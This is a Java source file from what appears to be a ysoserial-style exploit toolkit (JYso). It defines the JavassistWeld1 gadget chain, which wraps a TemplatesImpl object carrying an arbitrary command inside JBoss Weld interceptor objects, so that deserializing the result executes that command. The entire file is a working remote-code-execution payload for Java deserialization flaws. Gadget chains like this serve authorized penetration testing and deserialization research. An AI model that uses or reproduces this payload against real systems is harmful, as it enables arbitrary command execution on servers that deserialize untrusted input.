package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.qi4l.JYso.gadgets.utils.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.jboss.weld.interceptor.builder.InterceptionModelBuilder;
import org.jboss.weld.interceptor.builder.MethodReference;
import org.jboss.weld.interceptor.proxy.DefaultInvocationContextFactory;
import org.jboss.weld.interceptor.proxy.InterceptorMethodHandler;
import org.jboss.weld.interceptor.reader.ClassMetadataInterceptorReference;
import org.jboss.weld.interceptor.reader.DefaultMethodMetadata;
import org.jboss.weld.interceptor.reader.ReflectiveClassMetadata;
import org.jboss.weld.interceptor.reader.SimpleInterceptorMetadata;
import org.jboss.weld.interceptor.spi.instance.InterceptorInstantiator;
import org.jboss.weld.interceptor.spi.metadata.InterceptorReference;
import org.jboss.weld.interceptor.spi.metadata.MethodMetadata;
import org.jboss.weld.interceptor.spi.model.InterceptionModel;

import java.lang.reflect.Constructor;
import java.util.*;


/*
    by @matthias_kaiser
*/
@SuppressWarnings({"rawtypes", "unchecked","unused"})
@Dependencies({"javassist:javassist:3.12.1.GA", "org.jboss.weld:weld-core:1.1.33.Final",
        "javax.enterprise:cdi-api:1.0-SP1", "javax.interceptor:javax.interceptor-api:3.1",
        "org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final", "org.slf4j:slf4j-api:1.7.21"})
@Authors({Authors.MATTHIASKAISER})
public class JavassistWeld1 implements ObjectPayload<Object> {

    public Object getObject(String command) throws Exception {

        return get_chain(command, org.jboss.weld.interceptor.spi.model.InterceptionType.POST_ACTIVATE, null);
    }

    static Object get_chain(
            String command,
            org.jboss.weld.interceptor.spi.model.InterceptionType POST_ACTIVATE,
            org.jboss.interceptor.spi.model.InterceptionType POST_ACTIVATE1
    ) throws Exception {
        Object tpl = Gadgets.createTemplatesImpl(command);

        InterceptionModelBuilder builder = InterceptionModelBuilder.newBuilderFor(HashMap.class);
        ReflectiveClassMetadata metadata = (ReflectiveClassMetadata) ReflectiveClassMetadata.of(HashMap.class);
        InterceptorReference interceptorReference = ClassMetadataInterceptorReference.of(metadata);

        Set s = new HashSet<>();

        if (POST_ACTIVATE != null) {
            s.add(POST_ACTIVATE);
        } else {
            s.add(POST_ACTIVATE1);
        }


        Constructor defaultMethodMetadataConstructor = DefaultMethodMetadata.class.getDeclaredConstructor(Set.class, MethodReference.class);
        Reflections.setAccessible(defaultMethodMetadataConstructor);
        MethodMetadata methodMetadata = (MethodMetadata) defaultMethodMetadataConstructor.newInstance(s,
                MethodReference.of(TemplatesImpl.class.getMethod("newTransformer"), true));

        List list = new ArrayList();
        list.add(methodMetadata);
        Map hashMap = new HashMap<>();

        if (POST_ACTIVATE != null) {
            hashMap.put(POST_ACTIVATE, list);
        } else {
            hashMap.put(POST_ACTIVATE1, list);
        }

        SimpleInterceptorMetadata simpleInterceptorMetadata = new SimpleInterceptorMetadata(interceptorReference, true, hashMap);

        builder.interceptAll().with(simpleInterceptorMetadata);

        InterceptionModel model = builder.build();

        HashMap map = new HashMap();
        map.put("qi4l", "qi4l");

        DefaultInvocationContextFactory factory = new DefaultInvocationContextFactory();

        InterceptorInstantiator interceptorInstantiator = paramInterceptorReference -> tpl;

        return new InterceptorMethodHandler(map, metadata, model, interceptorInstantiator, factory);
    }
}
